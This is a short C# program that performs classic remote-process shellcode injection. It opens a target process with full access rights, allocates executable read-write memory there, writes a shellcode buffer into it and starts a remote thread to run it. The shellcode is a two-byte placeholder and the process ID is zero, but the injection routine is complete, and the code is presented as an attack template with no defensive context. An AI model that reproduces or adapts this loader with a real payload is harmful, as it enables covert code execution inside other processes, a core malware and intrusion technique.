using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

class Program
{
    const int PROCESS_ALL_ACCESS = (int)(0x000F0000L | 0x00100000L | 0xFFFF);

    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static byte[] shellcode = new byte[] {0xbb,0x34};

    static void Main()
    {
        int processId = 0;
        UIntPtr bytesWritten = UIntPtr.Zero;
        uint shellcode_size = (uint)shellcode.Length;
        IntPtr lpThreadId = IntPtr.Zero;

        IntPtr h_process = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
        IntPtr b_shellcode = VirtualAllocEx(h_process, IntPtr.Zero, shellcode_size, (uint)MEM_RESERVE | (uint)MEM_COMMIT, (uint)PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(h_process, b_shellcode, shellcode, shellcode_size, out bytesWritten);
        IntPtr h_thread = CreateRemoteThread(h_process, IntPtr.Zero, 0, b_shellcode, IntPtr.Zero, 0, lpThreadId);
    }
}